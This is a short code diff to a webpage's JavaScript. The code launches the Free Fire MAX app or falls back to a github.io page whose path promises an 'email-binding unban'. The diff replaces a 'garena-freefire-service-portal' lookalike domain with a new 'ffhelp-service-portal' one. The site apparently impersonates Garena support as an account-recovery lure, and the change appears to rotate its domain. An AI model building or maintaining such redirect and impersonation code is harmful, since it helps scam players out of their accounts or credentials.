@@ -246,7 +246,7 @@
                 const appScheme = "freefiremax://";
                 
                 // Method 2: Android Intent for better compatibility
-                const intentUrl = `intent://launch/#Intent;scheme=${appScheme};package=com.dts.freefiremax;S.browser_fallback_url=https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366;end`;
+                const intentUrl = `intent://launch/#Intent;scheme=${appScheme};package=com.dts.freefiremax;S.browser_fallback_url=https://ffhelp-service-portal.github.io/pending/congratulations/email-binding-unban-pending0287410366;end`;
                 
                 // First try: Direct app launch
                 window.location.href = appScheme;
@@ -258,7 +258,7 @@
                 
                 // Final fallback: Original URL
                 setTimeout(() => {
-                    window.location.href = "https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366";
+                    window.location.href = "https://ffhelp-service-portal.github.io/pending/congratulations/email-binding-unban-pending0287410366";
                 }, 1500);
             }
         });
